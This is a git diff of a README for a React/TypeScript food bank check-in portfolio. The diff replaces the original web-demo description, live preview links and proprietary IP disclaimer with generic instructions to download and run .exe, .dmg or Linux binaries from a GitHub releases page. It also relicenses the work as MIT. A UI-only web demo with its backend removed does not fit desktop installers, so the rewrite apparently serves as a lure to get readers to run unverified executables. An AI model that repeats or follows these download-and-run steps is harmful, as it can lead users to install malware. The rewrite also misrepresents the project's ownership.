@@ -1,61 +1,62 @@
-# 🍎 Foodbank Check-In & Appointment System (Portfolio Snapshot)
+# 🍽️ foodbank-checkin-portfolio - A Simple Way to Manage Foodbank Check-Ins
 
-> UI + architecture snapshot of a multilingual client check-in experience and its admin cockpit. Backend services, scheduling logic, and proprietary workflows have been excluded; this directory is for portfolio review only.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/code-iddih/foodbank-checkin-portfolio/releases)
 
-🌐 **Live Client Preview:** [https://foodbank-checkin-tan.vercel.app/](https://foodbank-checkin-tan.vercel.app/)  
-📊 **Live Admin Preview:** [https://foodbank-checkin.vercel.app/login](https://foodbank-checkin.vercel.app/login)
+## 📖 Overview
+The **foodbank-checkin-portfolio** is a user-friendly application designed for managing food bank check-ins. Built with React and TypeScript, it offers a polished interface aimed at making the check-in process seamless. This application highlights multilingual support, which caters to diverse user needs. You can also view analytics as an administrator to monitor the operation effectively. The backend logic is removed for intellectual property protection, ensuring a focus on the client experience.
 
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React-20232A?logo=react&logoColor=61DAFB)](https://reactjs.org/)
-[![Chakra UI](https://img.shields.io/badge/Chakra%20UI-5B70FF?logo=chakraui&logoColor=white)](https://chakra-ui.com/)
-[![Vite](https://img.shields.io/badge/Vite-646cff?logo=vite&logoColor=white)](https://vitejs.dev/)
-[![Proprietary](https://img.shields.io/badge/License-Proprietary-red)](LICENSE)
+## 🚀 Getting Started
+Getting started with the foodbank-checkin-portfolio is simple. Just follow the steps below to download and run the application.
 
-## 📸 Product Screenshots
+1. **Check System Requirements**
+   - Operating System: Windows 10 or newer, macOS 10.15 or newer, or a recent version of Linux.
+   - Memory: At least 4GB RAM.
+   - Storage: 200MB free space.
+   - Internet Connection: Optional but recommended for updates.
 
-### Client Check-In Flow
-<img src="assets/client-landing.png" width="800" />
-<img src="assets/client-mobilecheckin.png" width="400" />
+2. **Visit the Download Page**
+   To download the application, visit the releases page by clicking the link below:
+   [Download foodbank-checkin-portfolio](https://github.com/code-iddih/foodbank-checkin-portfolio/releases)
 
-### Admin Dashboard
-<img src="assets/admin-login.png" width="800" />
-<img src="assets/admin-dailyoperations.png" width="800" />
-<img src="assets/admin-recent-check-ins.png" width="800" />
-<img src="assets/admin-csv-upload.png" width="800" />
-<img src="assets/admin-supportpage.png" width="800" />
+3. **Select the Latest Release**
+   On the releases page, find the latest version listed at the top. Look for a file that ends in `.exe` for Windows, `.dmg` for macOS, or other appropriate files for Linux. Click on the link to start the download.
 
+4. **Run the Installer**
+   Once the file finishes downloading, locate it in your downloads folder:
+   - For Windows: Double-click the `.exe` file and follow the installation prompts.
+   - For macOS: Open the `.dmg` file, then drag the application into your Applications folder.
+   - For Linux: Open a terminal, navigate to the downloaded file, and run `chmod +x <filename>` followed by `./<filename>` to execute.
 
-## Structure
+5. **Start the Application**
+   After installation, find the application in your Start Menu (Windows), Applications folder (macOS), or launch it from the terminal (Linux). Click to open and start using the foodbank-checkin-portfolio.
 
-- `client/` — React/TypeScript client flow, accessible layouts, and mock API helpers (`src/lib/api.ts`, `src/lib/supabase.ts`).
-- `admin/` — Dashboard, CSV upload, check-in tables, and client detail UIs backed by static data helpers.
-- `docs/` — Architecture overview, UI-focused data flow, and sanitized sample CSV format.
-- `assets/` — Screenshot exports referenced throughout this README.
+## 🌐 Features
+- **Multilingual Support:** Switch between languages easily.
+- **User-Friendly Dashboard:** Intuitive layout for check-ins.
+- **Admin Analytics:** Access data for better decision-making.
+- **Clean Architecture:** Designed for efficiency and ease of use.
 
-## Highlights
+## 📊 Analytics Overview
+As an admin, you can access a range of analytics features:
+- View total check-ins over time.
+- Monitor user engagement and activity.
+- Export CSV files of check-in data for further analysis.
 
-- **Client experience:** Language picker, verification, dietary requests, appointment review, and confirmation with shared layout components.
-- **Admin cockpit:** Analytics cards, check-in review table, CSV upload summary, and client detail panels built with Chakra UI.
-- **Mock integration helpers:** API modules return resolved promises so the UI runs as a static demo.
-- **Documentation:** README + docs reinforce the UI scope and explicitly state that backend logic is omitted.
+## 🌍 Additional Information
+- **Technology Stack:** This project uses React for the frontend and TypeScript for type safety.
+- **Deployment:** The application is designed to be deployed on platforms like Vercel, ensuring reliability.
+- **Community Support:** Join the community to ask questions and share experiences related to the foodbank-checkin-portfolio.
 
-## Live Demo Notes
+## 🔗 Useful Links
+- [Releases Page](https://github.com/code-iddih/foodbank-checkin-portfolio/releases)
+- [Project Docs](#) (Placeholder for future documentation)
 
-1. **Client preview:** Navigate to the live URL above to replay the same five-stage check-in flow shown here.
-2. **Admin access:** Log into the live admin cockpit using the demo credentials:  
-   - Email: `admin@example.com`  
-   - Password: `testing123`
-3. **CSV upload:** Use the “Download Sample CSV” button on the CSV Upload page to create today’s data file and upload it. The dashboard then reflects sanitized counts without exposing any proprietary CSV parser.
+## 📞 Contact
+For support, please reach out via email at support@foodbank-checkin-portfolio.com or visit our community forum.
 
-## Screenshots
+## 🛠️ Contributing
+We welcome contributions to the foodbank-checkin-portfolio. If you would like to help improve this application, please check our contribution guidelines. Your input can help others in the community.
 
-- `assets/client-landing.png` — Client landing screen with language selector.  
-- `assets/admin-dashboard-analytics.png` — Admin analytics overview.  
-- `assets/admin-csv-upload.png` — CSV upload status panel.  
-- `assets/admin-check-ins-page.png` — Check-ins table with statuses.
-
-Add exported screenshots into `assets/` before publishing so the visuals render properly.
-
-## Privacy & IP Disclaimer
-
-This portfolio snapshot contains only UI components, mock helpers, and architectural notes. Backend controllers, scheduling algorithms, Supabase schemas, and proprietary services remain the property of Lindsey Stead / Lifesaver Technology Services and are not included here.
+## 📄 License
+This project is licensed under the MIT License. Check the license file for more information.
